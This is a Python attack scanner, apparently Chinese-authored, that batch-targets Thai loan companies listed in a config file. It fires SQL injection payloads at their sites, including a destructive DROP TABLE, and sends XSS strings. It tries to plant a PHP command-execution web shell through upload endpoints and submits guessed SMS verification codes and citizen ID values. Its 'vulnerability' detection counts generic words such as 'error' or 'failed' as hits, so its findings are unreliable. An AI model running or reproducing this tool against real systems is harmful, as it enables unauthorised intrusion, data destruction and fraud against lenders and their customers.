#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
泰国贷款系统漏洞检测工具
Thai Loan System Vulnerability Detector

专门用于检测泰国贷款系统的安全漏洞和业务逻辑漏洞
Specialized tool for detecting security vulnerabilities in Thai loan systems
"""

import requests
import json
import time
import concurrent.futures
import re
import random
import string
from urllib.parse import urljoin, urlparse
from datetime import datetime
import ssl
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class ThailandLoanDetector:
    def __init__(self, config_path: str = "config/thailand_loan_targets.json"):
        self.config = self.load_config(config_path)
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'th-TH,th;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
        self.results = []
        self.thailand_specific_keywords = [
            "สินเชื่อ", "personal loan", "home loan", "car loan",
            "credit card", "mortgage", "installment", "finance",
            "apply loan", "loan application", "credit approval",
            "ผ่อนชำระ", "กู้ยืน", "สินเชื่อส่วนบุคคล", "สินเชื่อบ้าน",
            "บัตรเครดิต", "การอนุมัติ", "ดอกเบี้ย", "ผลตอบแทน"
        ]

    def load_config(self, config_path: str) -> dict:
        """加载泰国贷款目标配置"""
        try:
            with open(config_path, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception as e:
            print(f"[ERROR] 无法加载配置文件: {e}")
            return {"thailand_loan_types": []}

    def detect_thai_language(self, content: str) -> bool:
        """检测是否包含泰语内容"""
        thai_patterns = [
            r'[\u0E00-\u0E7F]',  # 泰语Unicode范围
            r'สินเชื่อ', r'ผ่อน', r'กู้', r'บัตรเครดิต',
            r'personal loan', r'home loan', r'credit card'
        ]
        return any(re.search(pattern, content, re.IGNORECASE) for pattern in thai_patterns)

    def check_loan_application_forms(self, url: str) -> dict:
        """检查贷款申请表单"""
        try:
            response = self.session.get(url, timeout=10, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')

            forms = soup.find_all('form')
            loan_forms = []

            for form in forms:
                form_info = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'GET'),
                    'inputs': []
                }

                for input_field in form.find_all(['input', 'select', 'textarea']):
                    field_info = {
                        'type': input_field.get('type', 'text'),
                        'name': input_field.get('name', ''),
                        'id': input_field.get('id', ''),
                        'placeholder': input_field.get('placeholder', ''),
                        'required': input_field.has_attr('required')
                    }

                    # 泰国特定的表单字段
                    thai_fields = ['id_card', 'citizen_id', 'thai_id', 'phone', 'income']
                    if any(field in field_info['name'].lower() for field in thai_fields):
                        field_info['thai_specific'] = True

                    form_info['inputs'].append(field_info)

                # 检查是否是贷款申请表单
                if self.detect_loan_form(form_info):
                    loan_forms.append(form_info)

            return {
                'url': url,
                'forms_count': len(forms),
                'loan_forms_count': len(loan_forms),
                'loan_forms': loan_forms,
                'has_thai_content': self.detect_thai_language(response.text)
            }

        except Exception as e:
            return {
                'url': url,
                'error': str(e),
                'forms_count': 0,
                'loan_forms_count': 0,
                'loan_forms': [],
                'has_thai_content': False
            }

    def detect_loan_form(self, form_info: dict) -> bool:
        """检测是否为贷款申请表单"""
        loan_indicators = [
            'loan', 'credit', 'mortgage', 'application', 'apply',
            'สินเชื่อ', 'ผ่อน', 'กู้', 'คำร้อง'
        ]

        # 检查表单动作和字段
        action_lower = form_info['action'].lower()
        inputs_lower = [inp['name'].lower() for inp in form_info['inputs']]

        # 检查表单指标
        action_match = any(indicator in action_lower for indicator in loan_indicators)
        input_match = any(indicator in ' '.join(inputs_lower) for indicator in loan_indicators)

        # 检查泰国特定字段
        thai_specific_fields = any(inp.get('thai_specific', False) for inp in form_info['inputs'])

        return action_match or input_match or thai_specific_fields

    def test_sql_injection_thai(self, url: str) -> dict:
        """测试泰语文本的SQL注入漏洞"""
        thai_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "' WAITFOR DELAY '0:0:5'--",
            "'; DROP TABLE users--",
            "' OR (SELECT COUNT(*) FROM users)>0--"
        ]

        thai_keywords = [
            "สินเชื่อ", "ผ่อนชำระ", "กู้ยืน", "บัตรเครดิต",
            "personal", "loan", "credit", "mortgage"
        ]

        results = []

        for keyword in thai_keywords:
            test_url = f"{url}?search={keyword}"

            for payload in thai_payloads:
                try:
                    test_url_with_payload = f"{test_url}&q={payload}"
                    response = self.session.get(test_url_with_payload, timeout=10, verify=False)

                    # 检测SQL注入迹象
                    sql_indicators = [
                        'SQL syntax', 'MySQL', 'PostgreSQL', 'ORA-',
                        'mysql_fetch', 'pg_query', 'sqlite',
                        'warning', 'error', 'exception'
                    ]

                    sql_detected = any(indicator in response.text.lower() for indicator in sql_indicators)

                    if sql_detected:
                        results.append({
                            'keyword': keyword,
                            'payload': payload,
                            'url': test_url_with_payload,
                            'vulnerable': True,
                            'status_code': response.status_code,
                            'response_size': len(response.text)
                        })

                except Exception as e:
                    results.append({
                        'keyword': keyword,
                        'payload': payload,
                        'url': test_url_with_payload,
                        'error': str(e),
                        'vulnerable': False
                    })

        return {
            'url': url,
            'sql_test_results': results,
            'total_tests': len(thai_keywords) * len(thai_payloads),
            'vulnerable_count': len([r for r in results if r.get('vulnerable', False)])
        }

    def test_xss_thai(self, url: str) -> dict:
        """测试泰语文本的XSS漏洞"""
        thai_xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>"
        ]

        thai_keywords = [
            "สินเชื่อ", "ผ่อน", "กู้", "บัตรเครดิต",
            "loan", "credit", "apply", "personal"
        ]

        results = []

        for keyword in thai_keywords:
            for payload in thai_xss_payloads:
                try:
                    test_url = f"{url}?search={keyword}&q={payload}"
                    response = self.session.get(test_url, timeout=10, verify=False)

                    # 检测XSS回显
                    if payload.lower() in response.text.lower():
                        results.append({
                            'keyword': keyword,
                            'payload': payload,
                            'url': test_url,
                            'vulnerable': True,
                            'status_code': response.status_code,
                            'payload_detected': True
                        })

                except Exception as e:
                    results.append({
                        'keyword': keyword,
                        'payload': payload,
                        'url': test_url,
                        'error': str(e),
                        'vulnerable': False
                    })

        return {
            'url': url,
            'xss_test_results': results,
            'total_tests': len(thai_keywords) * len(thai_xss_payloads),
            'vulnerable_count': len([r for r in results if r.get('vulnerable', False)])
        }

    def test_file_upload(self, url: str) -> dict:
        """测试文件上传漏洞"""
        upload_endpoints = [
            '/upload', '/file-upload', '/document-upload',
            '/apply/upload', '/loan/upload'
        ]

        results = []

        for endpoint in upload_endpoints:
            upload_url = urljoin(url, endpoint)
            try:
                # 测试文件上传
                files = {
                    'file': ('test.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php')
                }
                data = {
                    'description': 'test upload',
                    'type': 'document'
                }

                response = self.session.post(upload_url, files=files, data=data, timeout=10, verify=False)

                # 检测上传漏洞
                upload_indicators = [
                    'upload successful', 'file uploaded', 'uploaded successfully',
                    'error', 'failed', 'invalid', 'extension'
                ]

                upload_detected = any(indicator in response.text.lower() for indicator in upload_indicators)

                results.append({
                    'endpoint': endpoint,
                    'url': upload_url,
                    'vulnerable': upload_detected,
                    'status_code': response.status_code,
                    'response_size': len(response.text)
                })

            except Exception as e:
                results.append({
                    'endpoint': endpoint,
                    'url': upload_url,
                    'error': str(e),
                    'vulnerable': False
                })

        return {
            'url': url,
            'upload_test_results': results,
            'vulnerable_endpoints': [r for r in results if r.get('vulnerable', False)]
        }

    def test_thai_specific_vulnerabilities(self, url: str) -> dict:
        """测试泰国特定漏洞"""
        thai_vuln_tests = []

        # 测试公民ID验证
        citizen_id_tests = self.test_citizen_id_validation(url)
        thai_vuln_tests.extend(citizen_id_tests)

        # 测试短信验证码
        sms_tests = self.test_sms_verification(url)
        thai_vuln_tests.extend(sms_tests)

        # 测试收入验证
        income_tests = self.test_income_validation(url)
        thai_vuln_tests.extend(income_tests)

        return {
            'url': url,
            'thai_specific_tests': thai_vuln_tests,
            'vulnerabilities_found': len([t for t in thai_vuln_tests if t.get('vulnerable', False)])
        }

    def test_citizen_id_validation(self, url: str) -> list:
        """测试公民ID验证漏洞"""
        citizen_id_payloads = [
            '1234567890123',  # 13位数字
            '9999999999999',  # 边界值
            '0000000000000',  # 边界值
            '123456789',      # 太短
            '12345678901234', # 太长
            'abcdefghijk',    # 字母
            '123456789012!',  # 特殊字符
            '',               # 空
            None              # NULL
        ]

        results = []

        for payload in citizen_id_payloads:
            try:
                data = {
                    'citizen_id': payload,
                    'action': 'validate'
                }

                response = self.session.post(url, data=data, timeout=10, verify=False)

                # 检测验证失败时的错误信息泄露
                error_indicators = [
                    'invalid', 'error', 'failed', 'wrong',
                    'ไม่ถูกต้อง', 'ผิดพลาด', 'ล้มเหลว'
                ]

                validation_error = any(indicator in response.text.lower() for indicator in error_indicators)

                results.append({
                    'test_type': 'citizen_id_validation',
                    'payload': payload,
                    'vulnerable': validation_error,
                    'status_code': response.status_code,
                    'response_size': len(response.text)
                })

            except Exception as e:
                results.append({
                    'test_type': 'citizen_id_validation',
                    'payload': payload,
                    'error': str(e),
                    'vulnerable': False
                })

        return results

    def test_sms_verification(self, url: str) -> list:
        """测试短信验证码漏洞"""
        sms_payloads = [
            '000000', '111111', '123456', '999999',
            '', None, 'abc123', '123456789012'
        ]

        results = []

        for payload in sms_payloads:
            try:
                data = {
                    'phone': '0801234567',
                    'sms_code': payload,
                    'action': 'verify'
                }

                response = self.session.post(url, data=data, timeout=10, verify=False)

                # 检测短信验证漏洞
                sms_indicators = [
                    'verified', 'success', 'correct',
                    'failed', 'invalid', 'wrong',
                    'ถูกต้อง', 'ผิดพลาด', 'สำเร็จ'
                ]

                verification_result = any(indicator in response.text.lower() for indicator in sms_indicators)

                results.append({
                    'test_type': 'sms_verification',
                    'payload': payload,
                    'vulnerable': verification_result,
                    'status_code': response.status_code,
                    'response_size': len(response.text)
                })

            except Exception as e:
                results.append({
                    'test_type': 'sms_verification',
                    'payload': payload,
                    'error': str(e),
                    'vulnerable': False
                })

        return results

    def test_income_validation(self, url: str) -> list:
        """测试收入验证绕过"""
        income_payloads = [
            '1000000',  # 高收入
            '1000',     # 低收入
            '-1000',    # 负数
            '0',        # 零收入
            '',         # 空
            None,       # NULL
            'abc123',   # 字母
            '1000000a' # 混合
        ]

        results = []

        for payload in income_payloads:
            try:
                data = {
                    'income': payload,
                    'loan_amount': '500000',
                    'action': 'validate_income'
                }

                response = self.session.post(url, data=data, timeout=10, verify=False)

                # 检测收入验证结果
                income_indicators = [
                    'approved', 'rejected', 'valid', 'invalid',
                    'สอดคล้อง', 'ไม่สอดคล้อง', 'อนุมัติ', 'ไม่อนุมัติ'
                ]

                validation_result = any(indicator in response.text.lower() for indicator in income_indicators)

                results.append({
                    'test_type': 'income_validation',
                    'payload': payload,
                    'vulnerable': validation_result,
                    'status_code': response.status_code,
                    'response_size': len(response.text)
                })

            except Exception as e:
                results.append({
                    'test_type': 'income_validation',
                    'payload': payload,
                    'error': str(e),
                    'vulnerable': False
                })

        return results

    def scan_target(self, target: dict) -> dict:
        """扫描单个目标"""
        print(f"[Thai Loan] 开始扫描: {target['name']} ({target['url']})")

        scan_result = {
            'target': target,
            'timestamp': datetime.now().isoformat(),
            'url': target['url'],
            'name': target['name'],
            'category': target.get('category', 'unknown'),
            'vulnerabilities': [],
            'forms_detected': 0,
            'sql_injection_vulnerabilities': 0,
            'xss_vulnerabilities': 0,
            'file_upload_vulnerabilities': 0,
            'thai_specific_vulnerabilities': 0,
            'total_tests': 0,
            'successful_tests': 0,
            'failed_tests': 0
        }

        # 1. 检查表单
        print(f"[Thai Loan] 检查表单: {target['url']}")
        form_result = self.check_loan_application_forms(target['url'])
        scan_result['forms_detected'] = form_result['loan_forms_count']
        scan_result['has_thai_content'] = form_result['has_thai_content']

        # 2. 测试SQL注入
        print(f"[Thai Loan] 测试SQL注入: {target['url']}")
        sql_result = self.test_sql_injection_thai(target['url'])
        scan_result['sql_injection_vulnerabilities'] = sql_result['vulnerable_count']
        scan_result['total_tests'] += sql_result['total_tests']
        scan_result['successful_tests'] += sql_result['vulnerable_count']

        # 3. 测试XSS
        print(f"[Thai Loan] 测试XSS漏洞: {target['url']}")
        xss_result = self.test_xss_thai(target['url'])
        scan_result['xss_vulnerabilities'] = xss_result['vulnerable_count']
        scan_result['total_tests'] += xss_result['total_tests']
        scan_result['successful_tests'] += xss_result['vulnerable_count']

        # 4. 测试文件上传
        print(f"[Thai Loan] 测试文件上传: {target['url']}")
        upload_result = self.test_file_upload(target['url'])
        scan_result['file_upload_vulnerabilities'] = len(upload_result['vulnerable_endpoints'])
        scan_result['total_tests'] += len(upload_result['upload_test_results'])
        scan_result['successful_tests'] += len(upload_result['vulnerable_endpoints'])

        # 5. 测试泰国特定漏洞
        print(f"[Thai Loan] 测试泰国特定漏洞: {target['url']}")
        thai_result = self.test_thai_specific_vulnerabilities(target['url'])
        scan_result['thai_specific_vulnerabilities'] = thai_result['vulnerabilities_found']
        scan_result['total_tests'] += len(thai_result['thai_specific_tests'])
        scan_result['successful_tests'] += thai_result['vulnerabilities_found']

        # 计算失败测试数
        scan_result['failed_tests'] = scan_result['total_tests'] - scan_result['successful_tests']

        # 生成漏洞摘要
        if scan_result['sql_injection_vulnerabilities'] > 0:
            scan_result['vulnerabilities'].append({
                'type': 'SQL Injection',
                'severity': 'high',
                'count': scan_result['sql_injection_vulnerabilities'],
                'description': '发现SQL注入漏洞'
            })

        if scan_result['xss_vulnerabilities'] > 0:
            scan_result['vulnerabilities'].append({
                'type': 'XSS',
                'severity': 'medium',
                'count': scan_result['xss_vulnerabilities'],
                'description': '发现跨站脚本漏洞'
            })

        if scan_result['file_upload_vulnerabilities'] > 0:
            scan_result['vulnerabilities'].append({
                'type': 'File Upload',
                'severity': 'high',
                'count': scan_result['file_upload_vulnerabilities'],
                'description': '发现文件上传漏洞'
            })

        if scan_result['thai_specific_vulnerabilities'] > 0:
            scan_result['vulnerabilities'].append({
                'type': 'Thai Specific',
                'severity': 'medium',
                'count': scan_result['thai_specific_vulnerabilities'],
                'description': '发现泰国特定漏洞'
            })

        # 生成风险评估
        total_vulnerabilities = sum(v['count'] for v in scan_result['vulnerabilities'])
        if total_vulnerabilities > 10:
            scan_result['risk_level'] = 'high'
        elif total_vulnerabilities > 5:
            scan_result['risk_level'] = 'medium'
        elif total_vulnerabilities > 0:
            scan_result['risk_level'] = 'low'
        else:
            scan_result['risk_level'] = 'minimal'

        print(f"[Thai Loan] 扫描完成: {target['name']} - 风险等级: {scan_result['risk_level']}")

        return scan_result

    def batch_scan(self, targets: list = None, max_workers: int = 3) -> list:
        """批量扫描多个目标"""
        if targets is None:
            targets = []
            for loan_type in self.config.get('thailand_loan_types', []):
                for company in loan_type.get('companies', []):
                    targets.append(company)

        print(f"[Thai Loan] 开始批量扫描 {len(targets)} 个目标")

        self.results = []

        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_target = {
                executor.submit(self.scan_target, target): target
                for target in targets
            }

            for future in concurrent.futures.as_completed(future_to_target):
                target = future_to_target[future]
                try:
                    result = future.result()
                    self.results.append(result)

                    # 实时显示进度
                    completed = len(self.results)
                    total = len(targets)
                    print(f"[Thai Loan] 进度: {completed}/{total} ({completed/total*100:.1f}%)")

                except Exception as e:
                    print(f"[ERROR] 扫描失败 {target['name']}: {e}")

        return self.results

    def generate_report(self) -> str:
        """生成扫描报告"""
        if not self.results:
            return "没有扫描结果"

        report = []
        report.append("=" * 80)
        report.append("泰国贷款系统漏洞检测报告")
        report.append("Thai Loan System Vulnerability Detection Report")
        report.append("=" * 80)
        report.append(f"扫描时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report.append(f"扫描目标总数: {len(self.results)}")
        report.append("")

        # 统计汇总
        total_targets = len(self.results)
        high_risk = len([r for r in self.results if r['risk_level'] == 'high'])
        medium_risk = len([r for r in self.results if r['risk_level'] == 'medium'])
        low_risk = len([r for r in self.results if r['risk_level'] == 'low'])
        minimal_risk = len([r for r in self.results if r['risk_level'] == 'minimal'])

        report.append("风险分布统计:")
        report.append(f"- 高风险: {high_risk}")
        report.append(f"- 中风险: {medium_risk}")
        report.append(f"- 低风险: {low_risk}")
        report.append(f"- 最小风险: {minimal_risk}")
        report.append("")

        # 详细结果
        for result in self.results:
            report.append(f"[{result['risk_level'].upper()}] {result['name']} ({result['url']})")
            report.append(f"  表单检测: {result['forms_detected']}")
            report.append(f"  SQL注入漏洞: {result['sql_injection_vulnerabilities']}")
            report.append(f"  XSS漏洞: {result['xss_vulnerabilities']}")
            report.append(f"  文件上传漏洞: {result['file_upload_vulnerabilities']}")
            report.append(f"  泰国特定漏洞: {result['thai_specific_vulnerabilities']}")

            if result['vulnerabilities']:
                report.append("  漏洞详情:")
                for vuln in result['vulnerabilities']:
                    report.append(f"    - {vuln['type']}: {vuln['count']} ({vuln['severity']})")
                    report.append(f"      {vuln['description']}")

            report.append("")

        return "\n".join(report)

    def save_results(self, filename: str = None) -> str:
        """保存扫描结果到文件"""
        if filename is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"thailand_loan_scan_report_{timestamp}.json"

        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(self.results, f, ensure_ascii=False, indent=2)

            # 同时保存文本报告
            text_report = self.generate_report()
            text_filename = filename.replace('.json', '.txt')
            with open(text_filename, 'w', encoding='utf-8') as f:
                f.write(text_report)

            return filename

        except Exception as e:
            print(f"[ERROR] 保存结果失败: {e}")
            return None

def main():
    """主函数"""
    print("Dragon-V Thai Loan System Vulnerability Detector")
    print("泰国贷款系统漏洞检测工具")
    print("=" * 60)

    detector = ThailandLoanDetector()

    # 开始扫描
    targets = []
    for loan_type in detector.config.get('thailand_loan_types', []):
        for company in loan_type.get('companies', []):
            targets.append(company)

    if not targets:
        print("[ERROR] 没有找到目标配置")
        return

    print(f"[INFO] 找到 {len(targets)} 个泰国贷款目标")

    # 执行扫描
    results = detector.batch_scan(targets, max_workers=2)

    # 生成并显示报告
    report = detector.generate_report()
    print(report)

    # 保存结果
    filename = detector.save_results()
    if filename:
        print(f"\n[SUCCESS] 结果已保存到: {filename}")

if __name__ == "__main__":
    main()